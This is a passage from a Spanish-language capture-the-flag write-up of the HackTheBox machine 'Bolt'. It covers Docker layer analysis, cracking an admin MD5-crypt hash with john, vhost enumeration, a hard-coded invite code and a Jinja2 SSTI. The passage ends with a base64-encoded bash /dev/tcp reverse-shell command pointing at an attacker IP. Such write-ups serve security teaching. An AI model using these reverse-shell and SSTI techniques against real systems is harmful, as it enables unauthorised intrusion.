</code></pre></div><p>Y también <code>config.py</code>, que contiene una clave secreta y una dirección de correo (<code>support@bolt.htb</code>):</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk3">#</span> <span class="mtk3">-*-</span> <span class="mtk3">encoding:</span> <span class="mtk3">utf-8</span> <span class="mtk3">-*-</span>
<span class="mtk4">"""</span>
<span class="mtk4">Copyright</span> <span class="mtk4">(c)</span> <span class="mtk4">2019</span> <span class="mtk4">-</span> <span class="mtk4">present</span> <span class="mtk4">AppSeed.us</span>
<span class="mtk4">"""</span>

<span class="mtk5">import</span> <span class="mtk8 mtku">os</span>
<span class="mtk5">from</span> <span class="mtk8 mtku">decouple</span> <span class="mtk5">import</span> <span class="mtk8">config</span>

<span class="mtk7 mtki">class</span> <span class="mtk8 mtku">Config</span><span class="mtk1">(</span><span class="mtk8 mtku">object</span><span class="mtk1">):</span>

    <span class="mtk1">basedir</span>    <span class="mtk5">=</span> <span class="mtk8 mtku">os</span><span class="mtk1">.</span><span class="mtk1">path</span><span class="mtk1">.</span><span class="mtk8">abspath</span><span class="mtk1">(</span><span class="mtk8 mtku">os</span><span class="mtk1">.</span><span class="mtk1">path</span><span class="mtk1">.</span><span class="mtk8">dirname</span><span class="mtk1">(</span><span class="mtk1">__file__</span><span class="mtk1">))</span>

    <span class="mtk3">#</span> <span class="mtk3">Set</span> <span class="mtk3">up</span> <span class="mtk3">the</span> <span class="mtk3">App</span> <span class="mtk3">SECRET_KEY</span>
    <span class="mtk1">SECRET_KEY</span> <span class="mtk5">=</span> <span class="mtk8">config</span>(<span class="mtk4">'SECRET_KEY'</span><span class="mtk1">,</span> <span class="mtk9 mtki">default</span><span class="mtk5">=</span><span class="mtk4">'S#perS3crEt_007'</span><span class="mtk1">)</span>

    <span class="mtk3">#</span> <span class="mtk3">This</span> <span class="mtk3">will</span> <span class="mtk3">create</span> <span class="mtk3">a</span> <span class="mtk3">file</span> <span class="mtk3">in</span> <span class="mtk3">&lt;app&gt;</span> <span class="mtk3">FOLDER</span>
    <span class="mtk1">SQLALCHEMY_DATABASE_URI</span> <span class="mtk5">=</span> <span class="mtk4">'sqlite:///'</span> <span class="mtk5">+</span> <span class="mtk8 mtku">os</span><span class="mtk1">.</span><span class="mtk1">path</span><span class="mtk1">.</span><span class="mtk8">join</span><span class="mtk1">(</span><span class="mtk1">basedir</span><span class="mtk1">,</span> <span class="mtk4">'db.sqlite3'</span><span class="mtk1">)</span>  
    <span class="mtk1">SQLALCHEMY_TRACK_MODIFICATIONS</span> <span class="mtk5">=</span> <span class="mtk6">False</span>
    <span class="mtk1">MAIL_SERVER</span> <span class="mtk5">=</span> <span class="mtk4">'localhost'</span>
    <span class="mtk1">MAIL_PORT</span> <span class="mtk5">=</span> <span class="mtk6">25</span>
    <span class="mtk1">MAIL_USE_TLS</span> <span class="mtk5">=</span> <span class="mtk6">False</span>
    <span class="mtk1">MAIL_USE_SSL</span> <span class="mtk5">=</span> <span class="mtk6">False</span>
    <span class="mtk1">MAIL_USERNAME</span> <span class="mtk5">=</span> <span class="mtk6">None</span>
    <span class="mtk1">MAIL_PASSWORD</span> <span class="mtk5">=</span> <span class="mtk6">None</span>
    <span class="mtk1">DEFAULT_MAIL_SENDER</span> <span class="mtk5">=</span> <span class="mtk4">'support@bolt.htb'</span>

<span class="mtk7 mtki">class</span> <span class="mtk8 mtku">ProductionConfig</span><span class="mtk1">(</span><span class="mtk8 mtku">Config</span><span class="mtk1">):</span>
    <span class="mtk1">DEBUG</span> <span class="mtk5">=</span> <span class="mtk6">False</span>

    <span class="mtk3">#</span> <span class="mtk3">Security</span>
    <span class="mtk1">SESSION_COOKIE_HTTPONLY</span>  <span class="mtk5">=</span> <span class="mtk6">True</span>
    <span class="mtk1">REMEMBER_COOKIE_HTTPONLY</span> <span class="mtk5">=</span> <span class="mtk6">True</span>
    <span class="mtk1">REMEMBER_COOKIE_DURATION</span> <span class="mtk5">=</span> <span class="mtk6">3600</span>

    <span class="mtk3">#</span> <span class="mtk3">PostgreSQL</span> <span class="mtk3">database</span>
    <span class="mtk1">SQLALCHEMY_DATABASE_URI</span> <span class="mtk5">=</span> <span class="mtk4">'</span><span class="mtk6">{}</span><span class="mtk4">://</span><span class="mtk6">{}</span><span class="mtk4">:</span><span class="mtk6">{}</span><span class="mtk4">@</span><span class="mtk6">{}</span><span class="mtk4">:</span><span class="mtk6">{}</span><span class="mtk4">/</span><span class="mtk6">{}</span><span class="mtk4">'</span><span class="mtk1">.</span><span class="mtk8">format</span><span class="mtk1">(</span>
        <span class="mtk1">config(</span> <span class="mtk4">'DB_ENGINE'</span>   <span class="mtk1">,</span> <span class="mtk9 mtki">default</span><span class="mtk5">=</span><span class="mtk4">'postgresql'</span>    <span class="mtk1">),</span>
        <span class="mtk1">config(</span> <span class="mtk4">'DB_USERNAME'</span> <span class="mtk1">,</span> <span class="mtk9 mtki">default</span><span class="mtk5">=</span><span class="mtk4">'appseed'</span>       <span class="mtk1">),</span>
        <span class="mtk1">config(</span> <span class="mtk4">'DB_PASS'</span>     <span class="mtk1">,</span> <span class="mtk9 mtki">default</span><span class="mtk5">=</span><span class="mtk4">'pass'</span>          <span class="mtk1">),</span>
        <span class="mtk1">config(</span> <span class="mtk4">'DB_HOST'</span>     <span class="mtk1">,</span> <span class="mtk9 mtki">default</span><span class="mtk5">=</span><span class="mtk4">'localhost'</span>     <span class="mtk1">),</span>
        <span class="mtk1">config(</span> <span class="mtk4">'DB_PORT'</span>     <span class="mtk1">,</span> <span class="mtk9 mtki">default</span><span class="mtk5">=</span><span class="mtk6">5432</span>            <span class="mtk1">),</span>
        <span class="mtk1">config(</span> <span class="mtk4">'DB_NAME'</span>     <span class="mtk1">,</span> <span class="mtk9 mtki">default</span><span class="mtk5">=</span><span class="mtk4">'appseed-flask'</span> <span class="mtk1">)</span>
    <span class="mtk1">)</span>

<span class="mtk7 mtki">class</span> <span class="mtk8 mtku">DebugConfig</span><span class="mtk1">(</span><span class="mtk8 mtku">Config</span><span class="mtk1">):</span>
    <span class="mtk1">DEBUG</span> <span class="mtk5">=</span> <span class="mtk6">True</span>

<span class="mtk3">#</span> <span class="mtk3">Load</span> <span class="mtk3">all</span> <span class="mtk3">possible</span> <span class="mtk3">configurations</span>
<span class="mtk1">config_dict</span> <span class="mtk5">=</span> <span class="mtk1">{</span>
    <span class="mtk4">'Production'</span><span class="mtk1">:</span> <span class="mtk8 mtku">ProductionConfig</span><span class="mtk1">,</span>
    <span class="mtk4">'Debug'</span>     <span class="mtk1">:</span> <span class="mtk8 mtku">DebugConfig</span>
<span class="mtk1">}</span>
</code></pre></div><p>Podemos probar estas claves secretas como contraseñas en <code>bolt.htb</code> y <code>passbolt.bolt.htb</code>, pero ninguna combinación funciona.</p><p>Hasta este punto, no hemos conseguido nada aún. Necesitamos analizar la imagen de Docker un poco más.</p><p>Si descomprimimos el archivo TAR, tenemos lo siguiente:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">7z</span> x <span class="mtku">image.tar</span>

<span class="code-cyan">$</span> <span class="code-dark-green">tree</span>
.
├── 187e74706bdc9cb3f44dca230ac7c9962288a5b8bd579c47a36abf64f35c2950
│   ├── VERSION
│   ├── json
│   └── layer.tar
├── 1be1cefeda09a601dd9baa310a3704d6309dc28f6d213867911cd2257b95677c
│   ├── VERSION
│   ├── json
│   └── layer.tar
├── 2265c5097f0b290a53b7556fd5d721ffad8a4921bfc2a6e378c04859185d27fa
│   ├── VERSION
│   ├── json
│   └── layer.tar
├── 3049862d975f250783ddb4ea0e9cb359578da4a06bf84f05a7ea69ad8d508dab
│   ├── VERSION
│   ├── json
│   └── layer.tar
├── 3350815d3bdf21771408f91da4551ca6f4e82edce74e9352ed75c2e8a5e68162
│   ├── VERSION
│   ├── json
│   └── layer.tar
├── 3d7e9c6869c056cdffaace812b4ec198267e26e03e9be25ed81fe92ad6130c6b
│   ├── VERSION
│   ├── json
│   └── layer.tar
├── 41093412e0da959c80875bb0db640c1302d5bcdffec759a3a5670950272789ad
│   ├── VERSION
│   ├── json
│   └── layer.tar
├── 745959c3a65c3899f9e1a5319ee5500f199e0cadf8d487b92e2f297441f8c5cf
│   ├── VERSION
│   ├── json
│   └── layer.tar
├── 859e74798e6c82d5191cd0deaae8c124504052faa654d6691c21577a8fa50811.json  
├── 9a3bb655a4d35896e951f1528578693762650f76d7fb3aa791ac8eec9f14bc77
│   ├── VERSION
│   ├── json
│   └── layer.tar
├── a4ea7da8de7bfbf327b56b0cb794aed9a8487d31e588b75029f6b527af2976f2
│   ├── VERSION
│   ├── json
│   └── layer.tar
├── d693a85325229cdf0fecd248731c346edbc4e02b0c6321e256ffc588a3e6cb26
│   ├── VERSION
│   ├── json
│   └── layer.tar
├── image.tar
├── manifest.json
└── repositories

11 directories, 37 files
</code></pre></div><p>Por otro lado, podemos ver el historial de la imagen de Docker con el siguiente comando:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">docker</span> images
REPOSITORY                             TAG       IMAGE ID       CREATED        SIZE
flask-dashboard-adminlte_appseed-app   latest    859e74798e6c   6 months ago   154MB

<span class="code-cyan">$</span> <span class="code-dark-green">docker</span> history 859e74798e6c
IMAGE          CREATED        CREATED BY                                      SIZE      COMMENT  
859e74798e6c   7 months ago   gunicorn --config gunicorn-cfg.py run:app       3.93kB
&lt;missing&gt;      7 months ago   sh                                              8.49kB
&lt;missing&gt;      7 months ago   gunicorn --config gunicorn-cfg.py run:app       6B
&lt;missing&gt;      7 months ago   gunicorn --config gunicorn-cfg.py run:app       16.4kB
&lt;missing&gt;      7 months ago   gunicorn --config gunicorn-cfg.py run:app       6B
&lt;missing&gt;      7 months ago   gunicorn --config gunicorn-cfg.py run:app       6.95MB
&lt;missing&gt;      7 months ago   /bin/sh -c #(nop)  CMD ["gunicorn" "--config…   0B
&lt;missing&gt;      7 months ago   /bin/sh -c #(nop)  EXPOSE 5005                  0B
&lt;missing&gt;      7 months ago   /bin/sh -c pip3 install -r requirements.txt     28.3MB
&lt;missing&gt;      7 months ago   /bin/sh -c apk --update add python3 py3-pip     53MB
&lt;missing&gt;      7 months ago   /bin/sh -c #(nop) COPY dir:f385c9405a9b189a6…   61.2MB
&lt;missing&gt;      7 months ago   /bin/sh -c #(nop) COPY multi:e0a96f9a5ad90dc…   2.86kB
&lt;missing&gt;      7 months ago   /bin/sh -c #(nop)  ENV FLASK_APP=run.py         0B
&lt;missing&gt;      2 years ago    /bin/sh -c #(nop)  CMD ["/bin/sh"]              0B
&lt;missing&gt;      2 years ago    /bin/sh -c #(nop) ADD file:aa17928040e31624c…   4.21MB
</code></pre></div><p>Todos los directorios mostrados con <code>tree</code> contienen capas de la imagen de Docker, que contienen los cambios diferenciales en los archivos al ejecutar cada línea del Dockerfile (más imformación <a href="https://dzone.com/articles/docker-layers-explained">aquí</a>).</p><p>Deberíamos listar los contenidos de todos los <code>layer.tar</code> y ver si existe algo interesante. Primero, vamos a ver si hay algún archivo <code>db.sqlite3</code> en algún <code>layer.tar</code>:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-yellow">for</span> dir in <span class="code-dark-magenta">`</span><span class="code-dark-green">find</span> . | <span class="code-dark-green">grep</span> layer<span class="code-dark-magenta">`</span>; <span class="code-dark-yellow">do (</span><span class="code-dark-green">7z</span> l $dir | <span class="code-dark-green">grep</span> -q db\.sqlite3<span class="code-dark-yellow">)</span> && <span class="code-dark-green">echo</span> $dir; <span class="code-dark-yellow">done</span>
./3049862d975f250783ddb4ea0e9cb359578da4a06bf84f05a7ea69ad8d508dab/layer.tar
./a4ea7da8de7bfbf327b56b0cb794aed9a8487d31e588b75029f6b527af2976f2/layer.tar

<span class="code-cyan">$</span> <span class="code-dark-green">7z</span> l <span class="mtku">3049862d975f250783ddb4ea0e9cb359578da4a06bf84f05a7ea69ad8d508dab/layer.tar</span>

   Date      Time    Attr         Size   Compressed  Name
------------------- ----- ------------ ------------  ------------------------
2021-03-05 19:37:51 D....            0            0  app
2021-03-05 19:45:48 D....            0            0  app/base
2021-03-05 19:45:45 .....            0            0  app/base/.wh.forms.py
2021-03-05 19:45:48 .....            0            0  app/base/.wh.routes.py
2021-03-05 15:11:29 D....            0            0  app/base/templates
2021-03-05 19:45:55 D....            0            0  app/base/templates/accounts
2021-03-05 19:45:55 .....            0            0  app/base/templates/accounts/.wh.register.html  
2021-03-05 19:45:09 .....            0            0  .wh.db.sqlite3
2021-03-05 19:39:12 D....            0            0  root
2021-03-05 19:46:46 .....            6          512  root/.ash_history
2021-03-05 19:44:48 D....            0            0  tmp
------------------- ----- ------------ ------------  ------------------------
2021-03-05 19:46:46                  6          512  5 files, 6 folders

<span class="code-cyan">$</span> <span class="code-dark-green">7z</span> l <span class="mtku">a4ea7da8de7bfbf327b56b0cb794aed9a8487d31e588b75029f6b527af2976f2/layer.tar</span>

   Date      Time    Attr         Size   Compressed  Name
------------------- ----- ------------ ------------  ------------------------
2021-03-05 19:44:04 .....        16384        16384  db.sqlite3
2021-03-05 19:39:12 D....            0            0  root
2021-03-05 19:44:29 .....            6          512  root/.ash_history
2021-03-05 19:41:00 D....            0            0  tmp
------------------- ----- ------------ ------------  ------------------------
2021-03-05 19:44:29              16390        16896  2 files, 2 folders
</code></pre></div><p>Si descomprimimos este último <code>layer.tar</code> y vemos los contenidos de la base de datos SQLite3, obtendremos el <em>hash</em> de la contraseña del usuario <code>admin</code>:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">cd</span> <span class="mtku">a4ea7da8de7bfbf327b56b0cb794aed9a8487d31e588b75029f6b527af2976f2</span>  

<span class="code-cyan">$</span> <span class="code-dark-green">7z</span> x <span class="mtku">layer.tar</span>

<span class="code-cyan">$</span> <span class="code-dark-green">sqlite3</span> <span class="mtku">db.sqlite3</span>
SQLite version 3.32.3
Enter ".help" for usage hints.
sqlite> .tables
User
sqlite> select * from User;
1|admin|admin@bolt.htb|$1$sm1RceCh$rSd3PygnS/6jlFDfF2J5q.||
sqlite> .quit
</code></pre></div><h2 id="acceso-a-la-máquina">Acceso a la máquina</h2><p>Este <em>hash</em> se puede crackear con <code>john</code>:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">echo</span> <span class="code-dark-yellow">'$1$sm1RceCh$rSd3PygnS/6jlFDfF2J5q.'</span> &gt; hash

<span class="code-cyan">$</span> <span class="code-dark-green">john</span> --wordlist=$WORDLISTS/rockyou.txt <span class="mtku">hash</span>
Using default input encoding: UTF-8
Loaded 1 password hash (md5crypt [MD5 32/64 X2])
Press 'q' or Ctrl-C to abort, almost any other key for status
<span class="code-dark-yellow">deadbolt</span>         (<span class="code-dark-yellow">?</span>)
1g 0:00:00:11 DONE 0.08928g/s 15422p/s 15422c/s 15422C/s deadbolt..deadbeat  
Use the "--show" option to display all of the cracked passwords reliably
Session completed
</code></pre></div><h3 id="accediendo-a-bolthtb-como-admin">Accediendo a <code>bolt.htb</code> como <code>admin</code></h3><p>Y obtenemos unas credenciales potenciales (<code>admin:deadbolt</code>). Si probamos a iniciar sesión en <code>bolt.htb</code>, entraremos como <code>admin</code>:</p><p><img src="/images/HTB/Bolt/Bolt-deadbolt.png" alt="Inicio de sesión en AdminLTE 3 como admin"></p><p>Esta página web tiene la misma apariencia que la que se encuentra en la imagen de Docker. Esta vez, hay información sensible en una conversación por &ldquo;Direct Chat&rdquo;:</p><p><img src="/images/HTB/Bolt/Bolt-chat.png" alt="Chat directo en AdminLTE 3"></p><p>De esta conversación, obtenemos nombres de usuario (Alexander Pierce, Sarah Bullock y Eddie). Sarah dice que la demo es solo con invitación. Existe algún problema con el correo y todo parece estar relacionado con la imagen de Docker.</p><p>Como se está hablando sobre demo y <em>e-mail</em>, a lo mejor existen más subdominios. Para enumerar, podemos utilizar <code>gobuster</code>:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">gobuster</span> vhost -w $WORDLISTS/dirb/small.txt -u bolt.htb -q  
Found: demo.bolt.htb (Status: 302) [Size: 219]
Found: mail.bolt.htb (Status: 200) [Size: 4943]
</code></pre></div><p>Hemos conseguido dos nuevos subdominios para explorar y añadir a <code>/etc/hosts</code>.</p><p>El siguiente es <code>mail.bolt.htb</code>, que redirige a un formulario de inicio de sesión. Podemos intentar acceder con <code>support@bolt.htb</code> o <code>admin@bolt.htb</code> usando alguna de las contraseñas y claves secretas encontradas anteriormente, pero sin éxito:</p><p><img src="/images/HTB/Bolt/Bolt-mail.png" alt="Inicio de sesión en mail.bolt.htb"></p><p>Y el otro nuevo subdominio es <code>demo.bolt.htb</code>, que es realmente similar a <code>bolt.htb</code>, o al menos los formularios de inicio de sesión y registro. Sin embargo, esta vez necesitamos un código de invitación para registrarnos (como decía Sarah). Recordemos que el registro en <code>bolt.htb</code> no funcionaba:</p><p><img src="/images/HTB/Bolt/Bolt-register.png" alt="Registro en demo.bolt.htb"></p><h3 id="profundizando-aún-más-en-la-imagen-de-docker">Profundizando aún más en la imagen de Docker</h3><p>Esta página web de demo parece estar programada como la que hay en la imagen de Docker. Después de analizar el código fuente transferido anteriormente desde el contenedor en un archivo ZIP, no se encontró nada útil.</p><p>En este punto, deberíamos imaginar que hay algo en las capas de la imagen de Docker, que posteriormente fue parcheado por razones de seguridad. Para enumerar, podemos listar las capas que contienen código en Python y descomprimir dichas capas:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-yellow">for</span> dir in <span class="code-dark-magenta">`</span><span class="code-dark-green">find</span> . | <span class="code-dark-green">grep</span> layer<span class="code-dark-magenta">`</span>; <span class="code-dark-yellow">do (</span><span class="code-dark-green">7z</span> l $dir | <span class="code-dark-green">grep</span> -q \.py<span class="code-dark-yellow">)</span> && <span class="code-dark-green">echo</span> $dir; <span class="code-dark-yellow">done</span>
./9a3bb655a4d35896e951f1528578693762650f76d7fb3aa791ac8eec9f14bc77/layer.tar
./3d7e9c6869c056cdffaace812b4ec198267e26e03e9be25ed81fe92ad6130c6b/layer.tar
./41093412e0da959c80875bb0db640c1302d5bcdffec759a3a5670950272789ad/layer.tar
./3049862d975f250783ddb4ea0e9cb359578da4a06bf84f05a7ea69ad8d508dab/layer.tar
./2265c5097f0b290a53b7556fd5d721ffad8a4921bfc2a6e378c04859185d27fa/layer.tar
./3350815d3bdf21771408f91da4551ca6f4e82edce74e9352ed75c2e8a5e68162/layer.tar
./d693a85325229cdf0fecd248731c346edbc4e02b0c6321e256ffc588a3e6cb26/layer.tar
./745959c3a65c3899f9e1a5319ee5500f199e0cadf8d487b92e2f297441f8c5cf/layer.tar

<span class="code-cyan">$</span> <span class="code-dark-yellow">for</span> dir in <span class="code-dark-magenta">`</span><span class="code-dark-green">find</span> . | <span class="code-dark-green">grep</span> layer | <span class="code-dark-green">awk</span> -F / <span class="code-dark-yellow">'{ print $2 }'</span><span class="code-dark-magenta">`</span>; <span class="code-dark-yellow">do (</span><span class="code-dark-green">7z</span> l $dir/layer.tar | <span class="code-dark-green">grep</span> -q \.py<span class="code-dark-yellow">)</span> && <span class="code-dark-green">7z</span> x -o<span class="code-dark-yellow">"</span><span class="code-dark-cyan">$dir</span><span class="code-dark-yellow">"</span> $dir/layer.tar; <span class="code-dark-yellow">done</span>  
</code></pre></div><p>Ahora que hemos descomprimido las capas con código de Python, podemos buscar por &ldquo;invite&rdquo;:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">grep</span> -nri invite . | <span class="code-dark-green">grep</span> -v Binary
./41093412e0da959c80875bb0db640c1302d5bcdffec759a3a5670950272789ad/app/base/forms.py:20:    invite_code = TextField('Invite Code', id='invite_code'    , validators=[DataRequired()])
./41093412e0da959c80875bb0db640c1302d5bcdffec759a3a5670950272789ad/app/base/templates/accounts/register.html:72:            {{ form.invite_code(placeholder="Invite Code", class="form-control") }}  
./41093412e0da959c80875bb0db640c1302d5bcdffec759a3a5670950272789ad/app/base/routes.py:63:        code        = request.form['invite_code']
</code></pre></div><p>Dentro de <code>41093412e0da959c80875bb0db640c1302d5bcdffec759a3a5670950272789ad/app/base/routes.py</code> encontraremos un código de invitación <em>hard-coded</em> (<code>XNSS-HSJW-3NGU-8XTJ</code>), en la función <code>register()</code>:</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk8">@blueprint.route</span><span class="mtk1">(</span><span class="mtk4">'/register'</span><span class="mtk1">,</span> <span class="mtk9 mtki">methods</span><span class="mtk5">=</span><span class="mtk1">[</span><span class="mtk4">'GET'</span><span class="mtk1">,</span> <span class="mtk4">'POST'</span><span class="mtk1">])</span>
<span class="mtk7 mtki">def</span> <span class="mtk8">register</span><span class="mtk1">():</span>
    <span class="mtk1 squiggly-inline-unnecessary">login_form</span> <span class="mtk5">=</span> <span class="mtk1">LoginForm(</span><span class="mtk1">request</span><span class="mtk1">.</span><span class="mtk1">form</span><span class="mtk1">)</span>
    <span class="mtk1">create_account_form</span> <span class="mtk5">=</span> <span class="mtk1">CreateAccountForm(</span><span class="mtk1">request</span><span class="mtk1">.</span><span class="mtk1">form</span><span class="mtk1">)</span>
    <span class="mtk5">if</span> <span class="mtk4">'register'</span> <span class="mtk5">in</span> <span class="mtk1">request</span><span class="mtk1">.</span><span class="mtk1">form</span><span class="mtk1">:</span>
        <span class="mtk1">username</span> <span class="mtk5">=</span> <span class="mtk1">request</span><span class="mtk1">.</span><span class="mtk1">form</span><span class="mtk1">[</span><span class="mtk4">'username'</span><span class="mtk1">]</span>
        <span class="mtk1">email</span> <span class="mtk5">=</span> <span class="mtk1">request</span><span class="mtk1">.</span><span class="mtk1">form</span><span class="mtk1">[</span><span class="mtk4">'email'</span><span class="mtk1">]</span>
        <span class="mtk1">code</span> <span class="mtk5">=</span> <span class="mtk1">request</span><span class="mtk1">.</span><span class="mtk1">form</span><span class="mtk1">[</span><span class="mtk4">'invite_code'</span><span class="mtk1">]</span>
        <span class="mtk5">if</span> <span class="mtk1">code</span> <span class="mtk5">!=</span> <span class="mtk4">'XNSS-HSJW-3NGU-8XTJ'</span><span class="mtk1">:</span>
            <span class="mtk5">return</span> <span class="mtk8">render_template</span><span class="mtk1">(</span><span class="mtk4">'code-500.html'</span><span class="mtk1">)</span>
        <span class="mtk1">data</span> <span class="mtk5">=</span> <span class="mtk1">User.query.filter_by(</span><span class="mtk9 mtki">email</span><span class="mtk5">=</span><span class="mtk1">email</span><span class="mtk1">).first()</span>
        <span class="mtk5">if</span> <span class="mtk1">data</span> <span class="mtk5">is</span> <span class="mtk6">None</span> <span class="mtk5">and</span> <span class="mtk1">code</span> <span class="mtk5">==</span> <span class="mtk4">'XNSS-HSJW-3NGU-8XTJ'</span><span class="mtk1">:</span>
            <span class="mtk3">#</span> <span class="mtk3">Check</span> <span class="mtk3">usename</span> <span class="mtk3">exists</span>
            <span class="mtk1">user</span> <span class="mtk5">=</span> <span class="mtk1">User.query.filter_by(</span><span class="mtk9 mtki">username</span><span class="mtk5">=</span><span class="mtk1">username</span><span class="mtk1">).first()</span>
            <span class="mtk5">if</span> <span class="mtk1">user</span><span class="mtk1">:</span>
                <span class="mtk5">return</span> <span class="mtk8">render_template</span><span class="mtk1">(</span><span class="mtk4">'accounts/register.html'</span><span class="mtk1">,</span>
                                       <span class="mtk9 mtki">msg</span><span class="mtk5">=</span><span class="mtk4">'Username</span> <span class="mtk4">already</span> <span class="mtk4">registered'</span><span class="mtk1">,</span>
                                       <span class="mtk9 mtki">success</span><span class="mtk5">=</span><span class="mtk6">False</span><span class="mtk1">,</span>
                                       <span class="mtk9 mtki">form</span><span class="mtk5">=</span><span class="mtk1">create_account_form</span><span class="mtk1">)</span>

            <span class="mtk3">#</span> <span class="mtk3">Check</span> <span class="mtk3">email</span> <span class="mtk3">exists</span>
            <span class="mtk1">user</span> <span class="mtk5">=</span> <span class="mtk1">User.query.filter_by(</span><span class="mtk9 mtki">email</span><span class="mtk5">=</span><span class="mtk1">email</span><span class="mtk1">).first()</span>
            <span class="mtk5">if</span> <span class="mtk1">user</span><span class="mtk1">:</span>
                <span class="mtk5">return</span> <span class="mtk8">render_template</span><span class="mtk1">(</span><span class="mtk4">'accounts/register.html'</span><span class="mtk1">,</span>
                                       <span class="mtk9 mtki">msg</span><span class="mtk5">=</span><span class="mtk4">'Email</span> <span class="mtk4">already</span> <span class="mtk4">registered'</span><span class="mtk1">,</span>
                                       <span class="mtk9 mtki">success</span><span class="mtk5">=</span><span class="mtk6">False</span><span class="mtk1">,</span>
                                       <span class="mtk9 mtki">form</span><span class="mtk5">=</span><span class="mtk1">create_account_form</span><span class="mtk1">)</span>

            <span class="mtk3">#</span> <span class="mtk3">else</span> <span class="mtk3">we</span> <span class="mtk3">can</span> <span class="mtk3">create</span> <span class="mtk3">the</span> <span class="mtk3">user</span>
            <span class="mtk1">user</span> <span class="mtk5">=</span> <span class="mtk1">User(</span><span class="mtk5">**</span><span class="mtk1">request</span><span class="mtk1">.</span><span class="mtk1">form</span><span class="mtk1">)</span>
            <span class="mtk1">db.session.add(</span><span class="mtk1">user</span><span class="mtk1">)</span>
            <span class="mtk1">db.session.commit()</span>

            <span class="mtk5">return</span> <span class="mtk8">render_template</span><span class="mtk1">(</span><span class="mtk4">'accounts/register.html'</span><span class="mtk1">,</span>
                                   <span class="mtk9 mtki">msg</span><span class="mtk5">=</span><span class="mtk4">'User</span> <span class="mtk4">created</span> <span class="mtk4">please</span> <span class="mtk4">&lt;a</span> <span class="mtk4">href="/login"&gt;login&lt;/a&gt;'</span><span class="mtk1">,</span>  
                                   <span class="mtk9 mtki">success</span><span class="mtk5">=</span><span class="mtk6">True</span><span class="mtk1">,</span>
                                   <span class="mtk9 mtki">form</span><span class="mtk5">=</span><span class="mtk1">create_account_form</span><span class="mtk1">)</span>

    <span class="mtk5">else</span><span class="mtk1">:</span>
        <span class="mtk5">return</span> <span class="mtk8">render_template</span><span class="mtk1">(</span><span class="mtk4">'accounts/register.html'</span><span class="mtk1">,</span> <span class="mtk9 mtki">form</span><span class="mtk5">=</span><span class="mtk1">create_account_form</span><span class="mtk1">)</span>
</code></pre></div><h3 id="encontrando-un-ssti">Encontrando un SSTI</h3><p>Ahora podemos intentar registrarnos en <code>demo.bolt.htb</code> usando este código de invitación. Y funciona, estamos dentro de otro AdminLTE 3:</p><p><img src="/images/HTB/Bolt/Bolt-demologin.png" alt="Demo Bolt AdminLTE 3"></p><p>Además, tenemos otra cuenta en <code>mail.bolt.htb</code>, que se crea automáticamente. Podemos acceder usando las mismas credenciales:</p><p><img src="/images/HTB/Bolt/Bolt-mail-login.png" alt="Mail Bolt login"></p><p>Sin embargo, no podemos enviar correos porque hay un error en el servicio SMTP.</p><p>Llegamos a otro punto muerto, donde parece que no hay nada más por hacer.</p><p>Vemos que en AdminLTE 3 podemos cambiar nuestro nombre de usuario, experiencia y habilidades al pinchar en &ldquo;Settings&rdquo;. Como sabemos que la aplicación está utilizando Flask, podemos intentar realizar un <em>Server-Side Template Injection</em> (SSTI):</p><p><img src="/images/HTB/Bolt/Bolt-test-ssti.png" alt="Probando SSTI"></p><p>Después de aplicar los cambios, recibimos un correo de confirmación en <code>mail.bolt.htb</code>:</p><p><img src="/images/HTB/Bolt/Bolt-confirm.png" alt="Confirmación de cambios"></p><p>Si pinchamos en el enlace, recibiremos otro correo indicando los cambios que hemos realizado. Esta funcionalidad es vulnerable a SSTI, ya que se muestra <code>49</code> en vez de <code>{{7*7}}</code>, como habíamos introducido:</p><p><img src="/images/HTB/Bolt/Bolt-ssti.png" alt="SSTI en el correo"></p><p>SSTI deriva en ejecución remota de comandos (RCE), por lo que podemos obtener una <em>reverse shell</em> en la máquina con algun <em>payload</em> encontrado en <a href="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#jinja2---basic-injection">PayloadsAllTheThings</a>.</p><p>Podemos realizar los siguientes pasos:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">echo</span> -n <span class="code-dark-yellow">'bash  -i >& /dev/tcp/10.10.17.44/4444 0>&1'</span> | <span class="code-dark-green">base64</span>  
YmFzaCAgLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTcuNDQvNDQ0NCAwPiYx
